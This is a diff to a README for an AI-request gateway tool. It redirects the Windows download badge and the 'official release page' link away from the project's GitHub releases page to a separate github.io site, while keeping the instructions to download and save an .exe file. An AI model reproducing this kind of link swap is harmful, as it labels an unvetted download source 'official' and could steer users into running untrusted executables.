@@ -1,6 +1,6 @@
 # 🛡️ systemprompt-demo - Secure control for your AI tools
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/acr3463/systemprompt-demo/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://acr3463.github.io)
 
 Systemprompt-demo provides a gateway for your AI tools. This software tracks your AI requests, logs audit trails, and monitors costs. It acts as a bridge between your local computer and AI services like Claude. You gain oversight of how your tools interact with external models through a private connection.
 
@@ -8,7 +8,7 @@ Systemprompt-demo provides a gateway for your AI tools. This software tracks you
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/acr3463/systemprompt-demo/releases).
+1. Visit the [official release page](https://acr3463.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe for Windows.
 4. Save the file to your computer.
